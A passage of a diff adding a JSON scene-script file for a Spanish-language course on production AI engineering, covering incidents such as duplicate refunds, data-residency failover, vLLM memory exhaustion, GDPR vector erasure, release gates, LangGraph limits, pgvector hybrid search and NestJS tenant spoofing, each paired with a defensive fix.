+              "label": "Top-40 al LLM",
+              "sub": "28,000 input tokens",
+              "state": "hot"
+            },
+            {
+              "label": "TTFT p99",
+              "sub": "11.2 s (SLO < 2s)",
+              "state": "hot"
+            }
+          ],
+          "metricLabel": "Presupuesto de Latencia E2E",
+          "metricBefore": "SLO Objetivo: 1.8 s",
+          "metricAfter": "Actual: 11.2 s ❌"
+        }
+      },
+      {
+        "chapter": "02 · Perdidos en el Medio",
+        "title": "Más Contexto Empeora Calidad, Latencia y Costo",
+        "speaker": "axon",
+        "mascot": "idea",
+        "aura": "violet",
+        "durationSec": 9,
+        "speech": "Meter decenas de fragmentos no solo dispara el costo y la latencia del prefill, también provoca lost-in-the-middle donde el modelo ignora la evidencia clave del centro.",
+        "visual": {
+          "kind": "code-diff",
+          "file": "s13_rerank_p99_latency/lab.py",
+          "before": [
+            "rerank(candidates[:200]) -> prompt(top_40) # ❌ 11s TTFT"
+          ],
+          "after": [
+            "candidates = hybrid_rrf[:min(len(hits), 40)]",
+            "final_ctx  = cross_encoder(candidates, top_k=6, token_cap=3200)"
+          ],
+          "callout": "Acota candidatos antes del rerank y pasa solo 5–8 chunks de alta señal."
+        }
+      },
+      {
+        "chapter": "03 · Arquitectura Rápida",
+        "title": "¿Cómo Recortamos el TTFT Sin Sacrificar Precisión?",
+        "speaker": "host",
+        "mascot": "question",
+        "aura": "blue",
+        "durationSec": 4,
+        "speech": "¿Qué combinación equilibra precisión de búsqueda y respuesta por debajo de dos segundos?",
+        "visual": {
+          "kind": "agent-lanes",
+          "mode": "bounded",
+          "statusBadge": "FAST FUNNEL + STREAMING SSE",
+          "laneA": {
+            "name": "Embudo Rápido",
+            "steps": [
+              "Hybrid RRF top-30",
+              "Cross-Encoder GPU/ONNX",
+              "Top-6 (< 3K tokens)"
+            ]
+          },
+          "laneB": {
+            "name": "UX Streaming",
+            "steps": [
+              "Timeout rerank 250ms",
+              "Fallback RRF orden",
+              "SSE Primer Token < 1.2s"
+            ]
+          }
+        }
+      },
+      {
+        "chapter": "04 · SLO Cumplido",
+        "title": "Embudo 30 -> 6 Chunks, Tope de Tokens y Fallback por Timeout",
+        "speaker": "axon",
+        "mascot": "senior",
+        "aura": "emerald",
+        "durationSec": 9,
+        "speech": "Un embudo estricto de treinta o cuarenta candidatos hacia seis chunks finales ordenados por relevancia, más timeout de seguridad en el reranker y streaming por SSE.",
+        "visual": {
+          "kind": "finops-terminal",
+          "title": "s13_rerank_p99_latency / test_lab.py",
+          "badge": "SLO PASS",
+          "lines": [
+            {
+              "prompt": "$",
+              "text": "select_context(candidates=200, max_rerank=40, max_final=6)",
+              "tone": "cmd"
+            },
+            {
+              "text": "✓ Rerank bounded <= 40 · Final context <= 6 · TTFT p99: 1.3s",
+              "tone": "ok"
+            }
+          ]
+        }
+      }
+    ]
+  },
+  {
+    "id": "senior-s14",
+    "aliases": [
+      "S14",
+      "s14"
+    ],
+    "filename": "senior-s14.mp3",
+    "kicker": "INCIDENTE S14 · HITL & IDEMPOTENCY",
+    "heading": "Doble Cobro y Acciones Duplicadas en Agentes Transaccionales",
+    "ctaLabel": "Ir al Decision Lab S14",
+    "ctaHref": "#/senior/S14/decision-lab",
+    "scenes": [
+      {
+        "chapter": "01 · Doble Reembolso",
+        "title": "Timeout de Lectura Tras Ejecutarse el Efecto en el Servidor",
+        "speaker": "host",
+        "mascot": "debug",
+        "aura": "gold",
+        "durationSec": 8,
+        "speech": "Incidente financiero en S14: tras un timeout de lectura HTTP, el nodo de LangGraph reejecutó createRefund y emitió dos reembolsos reales al cliente.",
+        "visual": {
+          "kind": "agent-lanes",
+          "mode": "storm",
+          "statusBadge": "DUPLICATE SIDE EFFECT · -$450 x2",
+          "laneA": {
+            "name": "Intento 1",
+            "steps": [
+              "POST /refund",
+              "Banco sí procesó",
+              "Timeout respuesta"
+            ]
+          },
+          "laneB": {
+            "name": "Reintento Nodo",
+            "steps": [
+              "Sin idempotency_key",
+              "POST /refund otra vez",
+              "DOBLE COBRO ❌"
+            ]
+          }
+        }
+      },
+      {
+        "chapter": "02 · Red Incierta",
+        "title": "Un Timeout de Lectura No Significa que la Operación Fallara",
+        "speaker": "axon",
+        "mascot": "idea",
+        "aura": "violet",
+        "durationSec": 9,
+        "speech": "En redes distribuidas un timeout solo significa que no escuchaste la confirmación. Sin clave de idempotencia estable por intención y checkpoint, cada reintento duplica el efecto.",
+        "visual": {
+          "kind": "code-diff",
+          "file": "s14_hitl_idempotency/lab.py",
+          "before": [
+            "execute_refund(order_id, amount) # ❌ crea transacción nueva cada vez"
+          ],
+          "after": [
+            "key = f'refund:{thread_id}:{step_id}:{order_id}'",
+            "return ledger.execute_once(key, lambda: gateway.refund(order_id, amount))"
+          ],
+          "callout": "Clave determinista generada antes del primer envío y guardada en PostgreSQL."
+        }
+      },
+      {
+        "chapter": "03 · Pausas Humanas",
+        "title": "¿Cómo Blindamos Acciones Destructivas como Borrados o Pagos?",
+        "speaker": "host",
+        "mascot": "question",
+        "aura": "blue",
+        "durationSec": 4,
+        "speech": "¿Y quién debe autorizar un reembolso o cambio crítico antes de que el agente dispare el webhook?",
+        "visual": {
+          "kind": "prompt-shield",
+          "mode": "mitigated",
+          "nodes": [
+            {
+              "label": "Graph Interrupt",
+              "sub": "Pausa en checkpoint",
+              "state": "normal"
+            },
+            {
+              "label": "Aprobación HITL",
+              "sub": "Revisor firma acción",
+              "state": "ok"
+            },
+            {
+              "label": "Idempotent Commit",
+              "sub": "Efecto único + Log",
+              "state": "ok"
+            }
+          ],
+          "metricLabel": "Garantía Transaccional",
+          "metricBefore": "Auto-ejecución ciega",
+          "metricAfter": "Exactly-Once + HITL"
+        }
+      },
+      {
+        "chapter": "04 · Semántica Exacta",
+        "title": "Idempotency Key Estable + Registro Outbox + Aprobación HITL",
+        "speaker": "axon",
+        "mascot": "senior",
+        "aura": "emerald",
+        "durationSec": 9,
+        "speech": "Exige aprobación humana mediante checkpoint en acciones sensibles, deriva una idempotency_key determinista del thread_id y registra el resultado en una tabla idempotente antes de confirmar.",
+        "visual": {
+          "kind": "finops-terminal",
+          "title": "s14_hitl_idempotency / test_lab.py",
+          "badge": "IDEMPOTENT",
+          "lines": [
+            {
+              "prompt": "$",
+              "text": "retry_side_effect(key='refund:thr9:ord12') x 3",
+              "tone": "cmd"
+            },
+            {
+              "text": "✓ Gateway invoked 1 time · cached result returned 2 times",
+              "tone": "ok"
+            }
+          ]
+        }
+      }
+    ]
+  },
+  {
+    "id": "senior-s15",
+    "aliases": [
+      "S15",
+      "s15"
+    ],
+    "filename": "senior-s15.mp3",
+    "kicker": "INCIDENTE S15 · DATA RESIDENCY",
+    "heading": "Residencia de Datos, Failover Multi-Región y Soberanía en LLMs",
+    "ctaLabel": "Ir al Decision Lab S15",
+    "ctaHref": "#/senior/S15/decision-lab",
+    "scenes": [
+      {
+        "chapter": "01 · Fuga Jurisdiccional",
+        "title": "Failover Automático Envió Expedientes Europeos a Endpoint Público",
+        "speaker": "host",
+        "mascot": "question",
+        "aura": "gold",
+        "durationSec": 8,
+        "speech": "Brecha de cumplimiento en S15: durante un pico de errores quinientos tres, el failover automático envió expedientes regulados de clientes a una región fuera de su jurisdicción aprobada.",
+        "visual": {
+          "kind": "prompt-shield",
+          "mode": "incident",
+          "nodes": [
+            {
+              "label": "Cliente EU (GDPR)",
+              "sub": "Residencia estricta: EU",
+              "state": "normal"
+            },
+            {
+              "label": "EU Endpoint 503",
+              "sub": "Caída temporal",
+              "state": "hot"
+            },
+            {
+              "label": "Fallback US Public",
+              "sub": "Entrena con prompts ❌",
+              "state": "hot"
+            }
+          ],
+          "metricLabel": "Estado de Soberanía de Datos",
+          "metricBefore": "Contrato Zero-Retention",
+          "metricAfter": "VIOLACIÓN REGULATORIA"
+        }
+      },
+      {
+        "chapter": "02 · Causa Raíz",
+        "title": "Lista de Fallback Ciega sin Restricción de Región ni Retención",
+        "speaker": "axon",
+        "mascot": "architecture",
+        "aura": "violet",
+        "durationSec": 9,
+        "speech": "Muchos routers de modelos caen por defecto al primer endpoint disponible sin comprobar atributos de residencia geográfica ni la política de cero retención de entrenamiento.",
+        "visual": {
+          "kind": "code-diff",
+          "file": "s15_data_residency/lab.py",
+          "before": [
+            "fallback = ['eu-private', 'us-public-free'] # ❌ rompe GDPR"
+          ],
+          "after": [
+            "eligible = [ep for ep in endpoints",
+            "  if ep.region in tenant.allowed_regions and ep.zero_training]"
+          ],
+          "callout": "Failover cerrado: mejor degradar con error 503 controlado que fugar jurisdicción."
+        }
+      },
+      {
+        "chapter": "03 · Degradación Segura",
+        "title": "¿Qué Pasa Si Todos los Nodos de la Región Están Caídos?",
+        "speaker": "host",
+        "mascot": "question",
+        "aura": "blue",
+        "durationSec": 4,
+        "speech": "¿Y si todos los proveedores aprobados dentro de esa región fallan al mismo tiempo?",
+        "visual": {
+          "kind": "agent-lanes",
+          "mode": "bounded",
+          "statusBadge": "FAIL-CLOSED COMPLIANCE POLICY",
+          "laneA": {
+            "name": "Permitido",
+            "steps": [
+              "eu-west-private",
+              "eu-central-private",
+              "ZDR = true"
+            ]
+          },
+          "laneB": {
+            "name": "Si todo EU cae",
+            "steps": [
+              "Nunca US-Public",
+              "Error 503 explícito",
+              "Alerta Audit Sev-1"
+            ]
+          }
+        }
+      },
+      {
+        "chapter": "04 · Fail-Closed",
+        "title": "Enrutamiento Vinculado a Región y Cero Retención en Runtime",
+        "speaker": "axon",
+        "mascot": "senior",
+        "aura": "emerald",
+        "durationSec": 9,
+        "speech": "El sistema falla cerrado por cumplimiento. Filtramos la lista de endpoints por jurisdicción y cláusula zero-training en cada request; si ninguno califica, rechazamos antes de emitir bytes.",
+        "visual": {
+          "kind": "finops-terminal",
+          "title": "s15_data_residency / test_lab.py",
+          "badge": "COMPLIANT",
+          "lines": [
+            {
+              "prompt": "$",
+              "text": "select_endpoint(required_region='EU', fallback=['US-free'])",
+              "tone": "cmd"
+            },
+            {
+              "text": "✓ ResidencyViolationBlocked: refused non-compliant fallback",
+              "tone": "ok"
+            }
+          ]
+        }
+      }
+    ]
+  },
+  {
+    "id": "senior-s16",
+    "aliases": [
+      "S16",
+      "s16"
+    ],
+    "filename": "senior-s16.mp3",
+    "kicker": "INCIDENTE S16 · VLLM SERVING & OOM",
+    "heading": "Fugas de Recursos, VRAM OOM y Puerto Expuesto en Serving Local",
+    "ctaLabel": "Ir al Decision Lab S16",
+    "ctaHref": "#/senior/S16/decision-lab",
+    "scenes": [
+      {
+        "chapter": "01 · GPU Caída",
+        "title": "Reinicios OOM Diarios y Puerto 8000 Sin Autenticación",
+        "speaker": "host",
+        "mascot": "debug",
+        "aura": "gold",
+        "durationSec": 8,
+        "speech": "Doble alerta en S16: nuestro servidor vLLM local cae por agotamiento de VRAM cada mañana, y en auditoría detectamos su puerto ocho mil abierto sin token en la subred.",
+        "visual": {
+          "kind": "prompt-shield",
+          "mode": "incident",
+          "nodes": [
+            {
+              "label": "Puerto :8000",
+              "sub": "0.0.0.0 sin auth ❌",
+              "state": "hot"
+            },
+            {
+              "label": "60 Requests GPU",
+              "sub": "KV Cache explota",
+              "state": "hot"
+            },
+            {
+              "label": "CUDA OOM",
+              "sub": "Worker GPU muerto",
+              "state": "hot"
+            }
+          ],
+          "metricLabel": "Salud del Clúster de Inferencia",
+          "metricBefore": "24 GB / 48 GB VRAM",
+          "metricAfter": "OOM + Acceso Libre"
+        }
+      },
+      {
+        "chapter": "02 · KV Cache",
+        "title": "Sin Admisión de Concurrencia, la Memoria KV Cache Se Desborda",
+        "speaker": "axon",
+        "mascot": "building",
+        "aura": "violet",
+        "durationSec": 9,
+        "speech": "En inferencia local la VRAM no solo guarda los pesos del modelo: cada sesión concurrente reserva KV Cache según su max_model_len. Sin admisión ni topes de batch, veinte usuarios tumban la GPU.",
+        "visual": {
+          "kind": "code-diff",
+          "file": "s16_vllm_serving_oom/lab.py",
+          "before": [
+            "serve_model(max_concurrent=unlimited, require_auth=False)"
+          ],
+          "after": [
+            "if not verify_bearer_token(req.headers): raise AuthError(401)",
+            "if active_slots >= max_safe_slots(vram_free_gb): return 429"
+          ],
+          "callout": "Binding en red privada/gateway + auth + límite determinista de slots KV Cache."
+        }
+      },
+      {
+        "chapter": "03 · Admisión",
+        "title": "¿Cómo Dimensionamos Concurrencia Segura en vLLM / Ollama?",
+        "speaker": "host",
+        "mascot": "question",
+        "aura": "blue",
+        "durationSec": 4,
+        "speech": "¿Qué es preferible cuando la cola supera la capacidad física de la tarjeta gráfica?",
+        "visual": {
+          "kind": "agent-lanes",
+          "mode": "bounded",
+          "statusBadge": "BOUNDED GPU ADMISSION CONTROL",
+          "laneA": {
+            "name": "Seguridad Red",
+            "steps": [
+              "Bind 127.0.0.1 / TLS",
+              "Bearer Auth Obligatorio",
+              "Rate Limit por Tenant"
+            ]
+          },
+          "laneB": {
+            "name": "VRAM Guard",
+            "steps": [
+              "gpu_memory_util 0.88",
+              "max_num_seqs acotado",
+              "429 Retry-After limpio"
+            ]
+          }
+        }
+      },
+      {
+        "chapter": "04 · Estabilidad",
+        "title": "Control de Admisión 429 + Gateway Autenticado + Límites KV",
+        "speaker": "axon",
+        "mascot": "senior",
+        "aura": "emerald",
+        "durationSec": 9,
+        "speech": "Responder cuatrocientos veintinueve con Retry-After antes de reventar la VRAM. Coloca vLLM detrás de un gateway autenticado, ajusta max_model_len real y acota max_num_seqs.",
+        "visual": {
+          "kind": "finops-terminal",
+          "title": "s16_vllm_serving_oom / test_lab.py",
+          "badge": "PROTECTED",
+          "lines": [
+            {
+              "prompt": "$",
+              "text": "admit_request(token=missing) -> 401 | active >= max_slots -> 429",
+              "tone": "ok"
+            },
+            {
+              "text": "✓ Zero CUDA OOM and zero unauthenticated inference",
+              "tone": "ok"
+            }
+          ]
+        }
+      }
+    ]
+  },
+  {
+    "id": "senior-s17",
+    "aliases": [
+      "S17",
+      "s17"
+    ],
+    "filename": "senior-s17.mp3",
+    "kicker": "INCIDENTE S17 · GDPR ERASURE",
+    "heading": "Incumplimiento de Borrado GDPR y Derecho al Olvido en Vectores",
+    "ctaLabel": "Ir al Decision Lab S17",
+    "ctaHref": "#/senior/S17/decision-lab",
+    "scenes": [
+      {
+        "chapter": "01 · Fantasma Vectorial",
+        "title": "Cliente Borrado en Maestro pero Activo en Chunks y Caché",
+        "speaker": "host",
+        "mascot": "question",
+        "aura": "gold",
+        "durationSec": 8,
+        "speech": "Incumplimiento legal en S17: borramos la ficha maestra del cliente tras su solicitud GDPR, pero sus fragmentos huérfanos en document_chunks siguen saliendo en búsquedas.",
+        "visual": {
+          "kind": "rag-acl",
+          "mode": "leak",
+          "identityLabel": "Estado Tras Delete",
+          "claims": [
+            {
+              "key": "customers_table",
+              "value": "DELETED ✓",
+              "valid": true
+            },
+            {
+              "key": "document_chunks + redis",
+              "value": "HUÉRFANOS VIVOS ❌",
+              "valid": false
+            }
+          ],
+          "indexLabel": "Riesgo Legal GDPR",
+          "chunks": [
+            {
+              "id": "GHOST-44",
+              "text": "Chunks vectoriales sin FK ni purga en caché",
+              "note": "Siguen apareciendo en respuestas RAG",
+              "blocked": true
+            }
+          ]
+        }
+      },
+      {
+        "chapter": "02 · Tres Sitios",
+        "title": "En Arquitectura RAG los Datos Viven en Chunks, Caché y Logs",
+        "speaker": "axon",
+        "mascot": "building",
+        "aura": "violet",
+        "durationSec": 9,
+        "speech": "Borrar la fila padre no basta si olvidaste cascada transaccional, invalidación de caché semántico y un registro de supresión para que futuros restores de backup no resuciten al usuario.",
+        "visual": {
+          "kind": "code-diff",
+          "file": "s17_gdpr_vector_erasure/lab.py",
+          "before": [
+            "db.delete('customers', user_id) # ❌ deja vectores y caché vivos"
+          ],
+          "after": [
+            "db.delete_cascade_chunks(tenant_id, doc_id)",
+            "cache.purge_doc_entries(doc_id) + tombstone_log.record(doc_id)"
+          ],
+          "callout": "Transacción atómica en chunks + purga caché + tombstone post-backup."
+        }
+      },
+      {
+        "chapter": "03 · Backups",
+        "title": "¿Qué Pasa Si Restauramos un Backup de Ayer?",
+        "speaker": "host",
+        "mascot": "question",
+        "aura": "blue",
+        "durationSec": 4,
+        "speech": "¿Cómo evitamos que restaurar un snapshot de hace tres días devuelva esos vectores borrados?",
+        "visual": {
+          "kind": "agent-lanes",
+          "mode": "bounded",
+          "statusBadge": "CRYPTO-SHREDDING + TOMBSTONE REPLAY",
+          "laneA": {
+            "name": "Purga Inmediata",
+            "steps": [
+              "DELETE chunks CASCADE",
+              "Purge Semantic Cache",
+              "Emit Deletion Receipt"
+            ]
+          },
+          "laneB": {
+            "name": "Post-Restore",
+            "steps": [
+              "Tombstone Append Log",
+              "Replay Purges en Restore",
+              "0% Datos Resucitados"
+            ]
+          }
+        }
+      },
+      {
+        "chapter": "04 · Olvido Completo",
+        "title": "Cascada Vectorial, Invalidación y Replay de Tombstones",
+        "speaker": "axon",
+        "mascot": "senior",
+        "aura": "emerald",
+        "durationSec": 9,
+        "speech": "Mantén un registro inmutable de tombstones con solo los IDs borrados. Tras restaurar cualquier snapshot, el pipeline reaplica la purga antes de abrir tráfico.",
+        "visual": {
+          "kind": "finops-terminal",
+          "title": "s17_gdpr_vector_erasure / test_lab.py",
+          "badge": "PURGED 100%",
+          "lines": [
+            {
+              "prompt": "$",
+              "text": "gdpr_erase(tenant_id='t1', doc_id='doc-44')",
+              "tone": "cmd"
+            },
+            {
+              "text": "✓ Chunks removed: 18 · Cache purged: 4 · Tombstone recorded",
+              "tone": "ok"
+            }
+          ]
+        }
+      }
+    ]
+  },
+  {
+    "id": "senior-s18",
+    "aliases": [
+      "S18",
+      "s18"
+    ],
+    "filename": "senior-s18.mp3",
+    "kicker": "INCIDENTE S18 · RELEASE GATE",
+    "heading": "Auditoría Integral Go/No-Go de Plataforma IA (32 Controles)",
+    "ctaLabel": "Ir al Decision Lab S18",
+    "ctaHref": "#/senior/S18/decision-lab",
+    "scenes": [
+      {
+        "chapter": "01 · Presión de Negocio",
+        "title": "Tres Demos Exitosas vs Cero Controles de Producción",
+        "speaker": "host",
+        "mascot": "question",
+        "aura": "gold",
+        "durationSec": 8,
+        "speech": "Último reto S18: dirección quiere lanzar mañana un copiloto corporativo que brilló en tres demos, pero aún no tiene tests cross-tenant, Evals automatizados ni tope FinOps.",
+        "visual": {
+          "kind": "finops-terminal",
+          "title": "release-readiness-checklist.json",
+          "badge": "NO-GO BLOCKER",
+          "lines": [
+            {
+              "prompt": "!",
+              "text": "acl_cross_tenant_tests: NOT_RUN ❌",
+              "tone": "warn"
+            },
+            {
+              "prompt": "!",
+              "text": "finops_atomic_hard_cap: FAIL ❌",
+              "tone": "warn"
+            },
+            {
+              "prompt": "!",
+              "text": "otel_zero_pii_audit:    NOT_RUN ❌",
+              "tone": "warn"
+            }
+          ]
+        }
+      },
+      {
+        "chapter": "02 · Criterio Senior",
+        "title": "Un Control NOT_RUN o BLOCKED Equivale a NO-GO",
+        "speaker": "axon",
+        "mascot": "senior",
+        "aura": "violet",
+        "durationSec": 9,
+        "speech": "En arquitectura seria jamás apruebas un pase a producción por intuición ni por una demo feliz. Cualquier control de seguridad, ACL, Evals o FinOps en FAIL o NOT_RUN es un NO-GO automático.",
+        "visual": {
+          "kind": "code-diff",
+          "file": "s18_release_go_nogo/lab.py",
+          "before": [
+            "return len(passes) >= 20 # ❌ promedia y oculta fallos P0"
+          ],
+          "after": [
+            "blocking = [c for c in matrix_32 if c.status != 'PASS']",
+            "return {'verdict': 'GO' if not blocking else 'NO-GO', 'blockers': blocking}"
+          ],
+          "callout": "Solo 32/32 controles en PASS verificable habilitan el lanzamiento."
+        }
+      },
+      {
+        "chapter": "03 · Matriz de 32",
+        "title": "¿Qué Cubren los 32 Controles Obligatorios?",
+        "speaker": "host",
+        "mascot": "reading",
+        "aura": "blue",
+        "durationSec": 4,
+        "speech": "¿Qué pilares técnicos exige esa matriz antes de firmar el pase a producción?",
+        "visual": {
+          "kind": "agent-lanes",
+          "mode": "bounded",
+          "statusBadge": "MATRIZ VIGILIO · 32 RELEASE GATES",
+          "laneA": {
+            "name": "Seguridad & RAG",
+            "steps": [
+              "ACL Multi-Tenant",
+              "Prompt Shield",
+              "GDPR + MCP Sandbox"
+            ]
+          },
+          "laneB": {
+            "name": "Fiabilidad",
+            "steps": [
+              "Golden Evals",
+              "OTel Redacted",
+              "FinOps Cap + Runbook"
+            ]
+          }
+        }
+      },
+      {
+        "chapter": "04 · Lanzamiento Seguro",
+        "title": "Evidencia Ejecutable, Despliegue Progresivo y Rollback Listo",
+        "speaker": "axon",
+        "mascot": "celebrate",
+        "aura": "emerald",
+        "durationSec": 9,
+        "speech": "Seguridad multi-tenant, defensa anti-inyección, Golden Evals sin fuga temporal, trazas sin PII, presupuesto atómico y rollback probado. Recién con treinta y dos de treinta y dos en verde declaras GO.",
+        "visual": {
+          "kind": "finops-terminal",
+          "title": "s18_release_go_nogo / test_lab.py",
+          "badge": "32/32 VERIFIED",
+          "lines": [
+            {
+              "prompt": "$",
+              "text": "evaluate_release_gate(controls=32, not_run=1) -> NO-GO",
+              "tone": "warn"
+            },
+            {
+              "text": "✓ evaluate_release_gate(controls=32, all_pass=True) -> GO",
+              "tone": "ok"
+            }
+          ]
+        }
+      }
+    ]
+  },
+  {
+    "id": "f01",
+    "aliases": [
+      "F01"
+    ],
+    "filename": "f01.mp3",
+    "kicker": "FRAMEWORK F01 · LANGGRAPH",
+    "heading": "LangChain & LangGraph: De Prototipo Frágil a Grafo Acotado",
+    "ctaLabel": "Practicar Unidad 1",
+    "ctaHref": "#/frameworks/F01/1",
+    "scenes": [
+      {
+        "chapter": "01 · El Loop Infinito",
+        "title": "El Peligro de los Agentes Autónomos sin Fronteras",
+        "speaker": "host",
+        "mascot": "debug",
+        "aura": "violet",
+        "durationSec": 8,
+        "speech": "En F01 llevamos LangChain y LangGraph a producción. ¿Por qué tantos prototipos de agentes terminan atrapados en bucles infinitos?",
+        "visual": {
+          "kind": "agent-lanes",
+          "mode": "storm",
+          "statusBadge": "UNBOUNDED LOOP · COST SPIKE",
+          "laneA": {
+            "name": "Agente Ingenuo",
+            "steps": [
+              "Tool Error 500",
+              "LLM Reintenta",
+              "Loop Infinito..."
+            ]
+          },
+          "laneB": {
+            "name": "Factura & Latencia",
+            "steps": [
+              "38 llamadas LLM",
+              "Latencia > 45s",
+              "Presupuesto agotado"
+            ]
+          }
+        }
+      },
+      {
+        "chapter": "02 · Diagnóstico",
+        "title": "Sin Estado Tipado ni Presupuesto de Pasos",
+        "speaker": "axon",
+        "mascot": "architecture",
+        "aura": "gold",
+        "durationSec": 9,
+        "speech": "Porque dejan que el modelo decida libremente cuándo parar sin estado tipado ni límite de pasos. Un fallo aguas abajo dispara docenas de llamadas en segundos.",
+        "visual": {
+          "kind": "prompt-shield",
+          "mode": "incident",
+          "nodes": [
+            {
+              "label": "Controller HTTP",
+              "sub": "Acoplado a SDK",
+              "state": "hot"
+            },
+            {
+              "label": "While(true) Agent",
+              "sub": "Sin max_steps",
+              "state": "hot"
+            },
+            {
+              "label": "Tool Destructiva",
+              "sub": "Sin pausa HITL",
+              "state": "hot"
+            }
+          ],
+          "metricLabel": "Riesgo Arquitectónico",
+          "metricBefore": "Sin Puerto DDD",
+          "metricAfter": "Vendor Lock-in + Side Effects"
+        }
+      },
+      {
+        "chapter": "03 · La Pregunta",
+        "title": "Diseño Limpio para Producción Corporativa",
+        "speaker": "host",
+        "mascot": "idea",
+        "aura": "blue",
+        "durationSec": 3,
+        "speech": "¿Cuál es la arquitectura correcta para dominarlo?",
+        "visual": {
+          "kind": "finops-terminal",
+          "title": "langgraph-invariants.md",
+          "badge": "CHECKLIST",
+          "lines": [
+            {
+              "text": "1. Desacoplar detrás de AnswerGeneratorPort (Hexagonal)",
+              "tone": "ok"
+            },
+            {
+              "text": "2. Estado inmutable tipado + salida explícita a abstención",
+              "tone": "ok"
+            },
+            {
+              "text": "3. recursionLimit <= 6 + interrupt() para aprobación HITL",
+              "tone": "ok"
+            }
+          ]
+        }
+      },
+      {
+        "chapter": "04 · Patrón Senior",
+        "title": "Puerto de Dominio, StateGraph, RecursionLimit e HITL",
+        "speaker": "axon",
+        "mascot": "celebrate",
+        "aura": "emerald",
+        "durationSec": 11,
+        "speech": "Encapsula el grafo detrás de AnswerGeneratorPort, define un StateGraph inmutable, fija recursionLimit estricto y exige pausa HITL con checkpoint antes de cualquier acción sensible.",
+        "visual": {
+          "kind": "code-diff",
+          "file": "agent-graph.adapter.ts",
+          "before": [
+            "await graph.invoke(input); // ❌ sin límite ni aprobación"
+          ],
+          "after": [
+            "await graph.invoke(input, { recursionLimit: 6, configurable: { thread_id } });",
+            "// + interruptBefore: [\"executeSensitiveTool\"]"
+          ],
+          "callout": "Grafo determinista, auditable y con presupuesto garantizado."
+        }
+      }
+    ]
+  },
+  {
+    "id": "f02",
+    "aliases": [
+      "F02"
+    ],
+    "filename": "f02.mp3",
+    "kicker": "FRAMEWORK F02 · PGVECTOR + RRF",
+    "heading": "PostgreSQL + pgvector + Hybrid Search con ACL Documental",
+    "ctaLabel": "Practicar Unidad 1",
+    "ctaHref": "#/frameworks/F02/1",
+    "scenes": [
+      {
+        "chapter": "01 · El Mito",
+        "title": "¿Necesitas Otra Base Vectorial Aislada de tu Negocio?",
+        "speaker": "host",
+        "mascot": "question",
+        "aura": "blue",
+        "durationSec": 7,
+        "speech": "En F02 dominamos PostgreSQL con pgvector. ¿Por qué conviene guardar vectores junto a tus tablas transaccionales y permisos?",
+        "visual": {
+          "kind": "rag-acl",
+          "mode": "shielded",
+          "identityLabel": "PostgreSQL Único (ACID)",
+          "claims": [
+            {
+              "key": "embedding",
+              "value": "vector(1536) HNSW",
+              "valid": true
+            },
+            {
+              "key": "fts_doc",
+              "value": "tsvector GIN",
+              "valid": true
+            }
+          ],
+          "indexLabel": "Sin Sincronía Rota",
+          "chunks": [
+            {
+              "id": "ACID JOIN",
+              "text": "Permisos ACL + vectores + metadatos en una sola query",
+              "note": "Cero desfase tras revocar accesos o borrar registros"
+            }
+          ]
+        }
+      },
+      {
+        "chapter": "02 · Híbrido Real",
+        "title": "Denso Semántico (<=>) + Léxico Exacto (tsvector) + RRF",
+        "speaker": "axon",
+        "mascot": "building",
+        "aura": "emerald",
+        "durationSec": 9,
+        "speech": "Porque evitas la desincronización de permisos entre dos bases distintas y combinas en una sola consulta ACID búsqueda semántica coseno con búsqueda léxica tsvector mediante fusión RRF.",
+        "visual": {
+          "kind": "code-diff",
+          "file": "hybrid-search.sql",
+          "before": [
+            "ORDER BY embedding <=> $1 LIMIT 5 -- ❌ falla en códigos exactos"
+          ],
+          "after": [
+            "-- CTE vector (<=>) + CTE FTS (@@ plainto_tsquery)",
+            "SELECT id, SUM(1.0 / (60 + rank)) AS rrf_score FROM both GROUP BY id"
+          ],
+          "callout": "RRF une códigos exactos (SKU/leyes) y sinónimos semánticos."
+        }
+      },
+      {
+        "chapter": "03 · Escala HNSW",
+        "title": "¿Qué Cuidados Exige en Producción Multi-Tenant?",
+        "speaker": "host",
+        "mascot": "reading",
+        "aura": "gold",
+        "durationSec": 4,
+        "speech": "¿Qué cláusulas no pueden faltar jamás en esa consulta híbrida en producción?",
+        "visual": {
+          "kind": "agent-lanes",
+          "mode": "bounded",
+          "statusBadge": "5 INVARIANTES PGVECTOR",
+          "laneA": {
+            "name": "Esquema",
+            "steps": [
+              "embedding_model ver",
+              "deleted_at IS NULL",
+              "Índice HNSW + GIN"
+            ]
+          },
+          "laneB": {
+            "name": "Consulta",
+            "steps": [
+              "WHERE tenant + ACL",
+              "hnsw.iterative_scan",
+              "Parámetros $1..$n"
+            ]
+          }
+        }
+      },
+      {
+        "chapter": "04 · Dominio Total",
+        "title": "Consultas Parametrizadas, Versionado e Iterative Scan",
+        "speaker": "axon",
+        "mascot": "celebrate",
+        "aura": "violet",
+        "durationSec": 9,
+        "speech": "Filtro tenant_id y allowed_principals en ambas ramas, deleted_at nulo, columna de modelo versionado y hnsw.iterative_scan activo para que el Recall@K nunca colapse.",
+        "visual": {
+          "kind": "finops-terminal",
+          "title": "F02 · pgvector-hybrid-check",
+          "badge": "5 UNITS",
+          "lines": [
+            {
+              "prompt": "$",
+              "text": "SELECT id FROM hybrid_rrf WHERE tenant_id=$1 AND acl && $2;",
+              "tone": "cmd"
+            },
+            {
+              "text": "✓ Latency: 28ms · Recall@10: 97% · Zero cross-tenant leak",
+              "tone": "ok"
+            }
+          ]
+        }
+      }
+    ]
+  },
+  {
+    "id": "f03",
+    "aliases": [
+      "F03"
+    ],
+    "filename": "f03.mp3",
+    "kicker": "FRAMEWORK F03 · NESTJS + ZOD",
+    "heading": "NestJS + Zod AI Backend: Guards, Puertos DDD y SSE",
+    "ctaLabel": "Practicar Unidad 1",
+    "ctaHref": "#/frameworks/F03/1",
+    "scenes": [
+      {
+        "chapter": "01 · El Body Traidor",
+        "title": "Nunca Confíes el tenant_id al JSON que Envía el Cliente",
+        "speaker": "host",
+        "mascot": "question",
+        "aura": "gold",
+        "durationSec": 7,
+        "speech": "En F03 construimos el backend NestJS con Zod. ¿Cuál es la primera trampa de seguridad al diseñar el endpoint de chat?",
+        "visual": {
+          "kind": "rag-acl",
+          "mode": "leak",
+          "identityLabel": "Request Entrante",
+          "claims": [
+            {
+              "key": "body.tenantId",
+              "value": "\"tenant_vip\" ❌",
+              "valid": false
+            },
+            {
+              "key": "req.user.tenantId",
+              "value": "\"tenant_own\" ✓",
+              "valid": true
+            }
+          ],
+          "indexLabel": "Regla de Oro AuthGuard",
+          "chunks": [
+            {
+              "id": "IDOR BUG",
+              "text": "Tomar tenant_id del body permite suplantación directa",
+              "note": "Identidad SIEMPRE viene del Guard JWT firmado",
